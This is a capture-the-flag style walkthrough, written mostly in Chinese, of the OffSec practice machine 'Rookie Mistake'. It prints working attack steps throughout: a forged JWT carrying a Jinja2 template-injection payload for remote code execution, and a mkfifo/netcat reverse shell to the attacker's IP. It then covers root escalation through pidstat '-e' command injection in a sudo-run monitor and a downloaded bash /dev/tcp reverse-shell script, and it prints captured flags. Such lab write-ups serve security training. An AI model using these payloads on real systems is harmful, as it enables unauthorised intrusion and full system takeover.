###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Rookie Mistake
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.169.221 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.169.221:22
Open 192.168.169.221:8080

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy syn-ack Werkzeug/2.1.2 Python/3.8.10
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-title: Mike's upcoming dynamic website!
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Thu, 25 Apr 2024 06:45:40 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2469
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head> 
|     <meta charset="UTF-8">
|     <title>Mike's upcoming dynamic website!</title>
|     <!-- Mobile Specific Meta --> 
```

buster
```
┌──(kali㉿kali)-[~/pgplay]
└─$ gobuster dir -u http://192.168.169.221:8080 -w /home/kali/SecLists/Discovery/Web-Content/common.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/edit                 (Status: 308) [Size: 253] [--> http://192.168.169.221:8080/edit/]
/login                (Status: 308) [Size: 255] [--> http://192.168.169.221:8080/login/]
/signup               (Status: 308) [Size: 257] [--> http://192.168.169.221:8080/signup/]
Progress: 4727 / 4727 (100.00%)
===============================================================
```

順序
1. `http://192.168.169.221:8080/signup/` 註冊一個帳號我用admin/admin
2. `http://192.168.169.221:8080/login/` 登入
3. `http://192.168.169.221:8080/edit/` 改密碼為ilovejwt，F12 -> Storage查看token的value，複製貼上至[JWT.io](https://jwt.io/?)
4. 將username改為`{{7*7}}`後，複製左邊的token貼到F12的storage按右上角的重整，再看頁面的重整看login name有沒有改成49

附上code
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Int7Nyo3fX0iLCJwdWJsaWNfaWQiOiIyNzVhNjNmYi03OGYyLTQyNGMtYWNjNi1iYzA0Nzg3ZjRmZjIiLCJleHAiOjE3MTQwMzEyOTB9.l1bwqVpmHzBf9ljzZ5Z-ShNx6fx1RhM43S2buCXWrdY
```

確認可以參考[Jinja2 SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#jinja-injection-without-less-than-class-object-greater-than)，確認可以執行ls
```
#RCE
username改成
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__('os').popen('ls').read() }}

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Int7IGNvbmZpZy5fX2NsYXNzX18uZnJvbV9lbnZ2YXIuX19nbG9iYWxzX18uX19idWlsdGluc19fLl9faW1wb3J0X18oJ29zJykucG9wZW4oJ2xzJykucmVhZCgpIH19IiwicHVibGljX2lkIjoiMjc1YTYzZmItNzhmMi00MjRjLWFjYzYtYmMwNDc4N2Y0ZmYyIiwiZXhwIjoxNzE0MDMxMjkwfQ.1sd4H_76SmNqv6OyUlr1jZ4M3qdP81nypGtbrUlJQzw
```

執行reverseshell
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp8080

{
  "username": "{{ config.__class__.from_envvar.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.236 8080 >/tmp/f').read() }}",
  "public_id": "275a63fb-78f2-424c-acc6-bc04787f4ff2",
  "exp": 1714031290
}

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Int7IGNvbmZpZy5fX2NsYXNzX18uZnJvbV9lbnZ2YXIuX19nbG9iYWxzX18uX19idWlsdGluc19fLl9faW1wb3J0X18oJ29zJykucG9wZW4oJ3JtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjM2IDgwODAgPi90bXAvZicpLnJlYWQoKSB9fSIsInB1YmxpY19pZCI6IjI3NWE2M2ZiLTc4ZjItNDI0Yy1hY2M2LWJjMDQ3ODdmNGZmMiIsImV4cCI6MTcxNDAzMTI5MH0.hm-meW8frsb3upqiz2N2afeHfnA5S7mamcGS8XE_aYQ
```

貼上重整就可以得反彈shell，在`/home/mike`可得local.txt
```
mike@MikeServer:~$ cat local.txt
d6ac9c5c093bb53a50bb5b3be60bf7b6
```

查看`sudo -l`，執行`PidMonitorServer`發現他會運行在`9123port`，可以加上`&`來讓他在背景執行
```
mike@MikeServer:~$ sudo -l
sudo -l
Matching Defaults entries for mike on MikeServer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on MikeServer:
    (ALL) NOPASSWD: /usr/local/bin/PidMonitorServer

mike@MikeServer:~$ sudo /usr/local/bin/PidMonitorServer &
sudo /usr/local/bin/PidMonitorServer
Access Mike's own process monitor server started at port 9123!
```

利用curl來查看，發現他是一個`pid monitor`，可認知為`pidstat`，查看[GTFOBins](https://gtfobins.github.io/gtfobins/pidstat/#sudo)，利用`-e id`可得id
```
mike@MikeServer:~$ curl http://127.0.0.1:9123
<h1>Welcome to my PID status monitor. You can specify the PID in the URL '/pid/*'!

curl 127.0.0.1:9123/pid/1%20-e%20id

mike@MikeServer:~$ curl 127.0.0.1:9123/pid/1%20-e%20id
<h1>Getting status of PID: 1 -e id...</h1>

b'Linux 5.4.0-121-generic (MikeServer) \t04/25/2024 \t_x86_64_\t(2 CPU)\n\n08:55:55 AM   UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command\n08:55:55 AM     0         1    0.07    0.19    0.00    0.02    0.26     0  systemd\n08:55:55 AM     0      1836    0.00    0.00    0.00    0.00    0.00     1  pidstat\nuid=0(root) gid=0(root) groups=0(root)\n
```

下載一個reverseshell
```
#pwn.sh
bash -c 'bash -i >& /dev/tcp/192.168.45.236/22 0>&1'

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp22

mike@MikeServer:~$ wget 192.168.45.236:22/pwn.sh
mike@MikeServer:~$ chmod +x pwn.sh
mike@MikeServer:~$ curl 127.0.0.1:9123/pid/1%20-e%20bash%20.%2Fpwn.sh
```

得回彈，可到/root得proof.txt
```
root@MikeServer:~# cat proof.txt
0d62a282eb8e833c77b0ed9c4da76d0c
```